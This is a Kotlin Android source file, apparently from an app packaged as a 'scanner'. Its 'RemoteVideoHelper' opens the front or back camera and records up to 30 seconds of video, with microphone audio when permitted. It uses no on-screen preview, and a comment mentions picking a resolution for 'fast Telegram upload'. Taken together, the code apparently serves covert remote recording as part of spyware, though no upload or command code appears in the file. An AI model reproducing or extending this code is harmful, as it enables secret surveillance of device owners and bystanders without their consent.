package com.example.scanner

import android.Manifest
import android.annotation.SuppressLint
import android.content.Context
import android.content.pm.PackageManager
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.hardware.camera2.CaptureRequest
import android.media.CamcorderProfile
import android.media.MediaRecorder
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import androidx.core.content.ContextCompat
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlinx.coroutines.withContext
import kotlinx.coroutines.withTimeoutOrNull
import java.io.File
import kotlin.coroutines.resume

object RemoteVideoHelper {

    @SuppressLint("MissingPermission")
    suspend fun recordVideo(context: Context, isFront: Boolean, durationSeconds: Int): Result<File> = withContext(Dispatchers.IO) {
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            return@withContext Result.failure(Exception("Camera permission is not granted on this device."))
        }

        val clampedDuration = durationSeconds.coerceIn(3, 30)

        val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as? CameraManager
            ?: return@withContext Result.failure(Exception("Camera service not available on device"))

        val targetFacing = if (isFront) CameraCharacteristics.LENS_FACING_FRONT else CameraCharacteristics.LENS_FACING_BACK

        val cameraId = cameraManager.cameraIdList.firstOrNull { id ->
            val chars = cameraManager.getCameraCharacteristics(id)
            chars.get(CameraCharacteristics.LENS_FACING) == targetFacing
        } ?: cameraManager.cameraIdList.firstOrNull()
        ?: return@withContext Result.failure(Exception("No suitable camera lens found for video recording"))

        val characteristics = cameraManager.getCameraCharacteristics(cameraId)
        val streamMap = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
        val sizes = streamMap?.getOutputSizes(MediaRecorder::class.java) ?: emptyArray()

        // Choose a compact resolution (720p or 480p) for high quality and fast Telegram upload
        val targetSize = sizes.firstOrNull { (it.width == 1280 && it.height == 720) || (it.width == 720 && it.height == 1280) }
            ?: sizes.firstOrNull { (it.width == 640 && it.height == 480) || (it.width == 480 && it.height == 640) }
            ?: sizes.firstOrNull { it.width in 600..1280 }
            ?: sizes.firstOrNull()

        val width = targetSize?.width ?: 1280
        val height = targetSize?.height ?: 720

        val timeoutMs = (clampedDuration * 1000L) + 12000L
        val result = withTimeoutOrNull(timeoutMs) {
            recordInternal(context, cameraManager, characteristics, cameraId, width, height, isFront, clampedDuration)
        }

        result ?: Result.failure(Exception("Video recording timed out."))
    }

    @SuppressLint("MissingPermission")
    private suspend fun recordInternal(
        context: Context,
        cameraManager: CameraManager,
        characteristics: CameraCharacteristics,
        cameraId: String,
        width: Int,
        height: Int,
        isFront: Boolean,
        durationSeconds: Int
    ): Result<File> = suspendCancellableCoroutine { continuation ->

        val handlerThread = HandlerThread("RemoteVideoThread_${System.currentTimeMillis()}").apply { start() }
        val handler = Handler(handlerThread.looper)

        val prefix = if (isFront) "vid_front" else "vid_back"
        val outFile = File(context.cacheDir, "${prefix}_${System.currentTimeMillis()}.mp4")

        var mediaRecorder: MediaRecorder? = null
        var cameraDevice: CameraDevice? = null
        var captureSession: CameraCaptureSession? = null
        val isCompleted = java.util.concurrent.atomic.AtomicBoolean(false)
        var isRecording = false

        fun cleanup() {
            try {
                if (isRecording) {
                    try { mediaRecorder?.stop() } catch (_: Throwable) {}
                    isRecording = false
                }
                mediaRecorder?.reset()
                mediaRecorder?.release()
                mediaRecorder = null
            } catch (_: Throwable) {}

            try { captureSession?.close() } catch (_: Throwable) {}
            captureSession = null

            try { cameraDevice?.close() } catch (_: Throwable) {}
            cameraDevice = null

            try { handlerThread.quitSafely() } catch (_: Throwable) {}
        }

        fun completeWith(result: Result<File>) {
            if (isCompleted.compareAndSet(false, true)) {
                cleanup()
                if (continuation.isActive) {
                    continuation.resume(result)
                }
            }
        }

        continuation.invokeOnCancellation {
            cleanup()
        }

        val hasAudioPermission = ContextCompat.checkSelfPermission(
            context,
            Manifest.permission.RECORD_AUDIO
        ) == PackageManager.PERMISSION_GRANTED

        val stateCallback = object : CameraDevice.StateCallback() {
            override fun onOpened(camera: CameraDevice) {
                cameraDevice = camera

                try {
                    val recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                        MediaRecorder(context)
                    } else {
                        @Suppress("DEPRECATION")
                        MediaRecorder()
                    }
                    mediaRecorder = recorder

                    if (hasAudioPermission) {
                        recorder.setAudioSource(MediaRecorder.AudioSource.MIC)
                    }
                    recorder.setVideoSource(MediaRecorder.VideoSource.SURFACE)
                    recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                    recorder.setOutputFile(outFile.absolutePath)
                    recorder.setVideoEncodingBitRate(2_000_000)
                    recorder.setVideoFrameRate(30)
                    recorder.setVideoSize(width, height)
                    recorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264)
                    if (hasAudioPermission) {
                        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                        recorder.setAudioEncodingBitRate(96000)
                        recorder.setAudioSamplingRate(44100)
                    }

                    recorder.prepare()
                    val surface = recorder.surface

                    val surfaces = listOf(surface)
                    @Suppress("DEPRECATION")
                    camera.createCaptureSession(surfaces, object : CameraCaptureSession.StateCallback() {
                        override fun onConfigured(session: CameraCaptureSession) {
                            captureSession = session
                            try {
                                val recordBuilder = camera.createCaptureRequest(CameraDevice.TEMPLATE_RECORD).apply {
                                    addTarget(surface)

                                    val afModes = characteristics.get(CameraCharacteristics.CONTROL_AF_AVAILABLE_MODES) ?: intArrayOf()
                                    if (afModes.contains(CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_VIDEO)) {
                                        set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_VIDEO)
                                    } else if (afModes.contains(CaptureRequest.CONTROL_AF_MODE_AUTO)) {
                                        set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_AUTO)
                                    }

                                    val aeModes = characteristics.get(CameraCharacteristics.CONTROL_AE_AVAILABLE_MODES) ?: intArrayOf()
                                    if (aeModes.contains(CaptureRequest.CONTROL_AE_MODE_ON)) {
                                        set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
                                    }

                                    val sensorOrientation = characteristics.get(CameraCharacteristics.SENSOR_ORIENTATION) ?: 0
                                    set(CaptureRequest.JPEG_ORIENTATION, sensorOrientation)
                                }
                                session.setRepeatingRequest(recordBuilder.build(), null, handler)
                                recorder.start()
                                isRecording = true

                                // Schedule stop after durationSeconds
                                handler.postDelayed({
                                    try {
                                        if (isRecording) {
                                            recorder.stop()
                                            isRecording = false
                                        }
                                        if (outFile.exists() && outFile.length() > 0) {
                                            completeWith(Result.success(outFile))
                                        } else {
                                            completeWith(Result.failure(Exception("Recorded video file is empty or missing")))
                                        }
                                    } catch (e: Exception) {
                                        completeWith(Result.failure(e))
                                    }
                                }, durationSeconds * 1000L)

                            } catch (e: Exception) {
                                completeWith(Result.failure(e))
                            }
                        }

                        override fun onConfigureFailed(session: CameraCaptureSession) {
                            completeWith(Result.failure(Exception("Failed to configure video capture session")))
                        }
                    }, handler)

                } catch (e: Exception) {
                    completeWith(Result.failure(e))
                }
            }

            override fun onDisconnected(camera: CameraDevice) {
                cameraDevice = camera
                completeWith(Result.failure(Exception("Camera disconnected during video recording")))
            }

            override fun onError(camera: CameraDevice, error: Int) {
                cameraDevice = camera
                val reason = when (error) {
                    ERROR_CAMERA_IN_USE -> "Camera already in use by another app"
                    ERROR_MAX_CAMERAS_IN_USE -> "Max cameras in use"
                    ERROR_CAMERA_DISABLED -> "Camera disabled by system policy"
                    ERROR_CAMERA_DEVICE -> "Camera device hardware error"
                    ERROR_CAMERA_SERVICE -> "Camera system service error"
                    else -> "Camera error code: $error"
                }
                completeWith(Result.failure(Exception(reason)))
            }
        }

        try {
            cameraManager.openCamera(cameraId, stateCallback, handler)
        } catch (e: Exception) {
            completeWith(Result.failure(e))
        }
    }
}
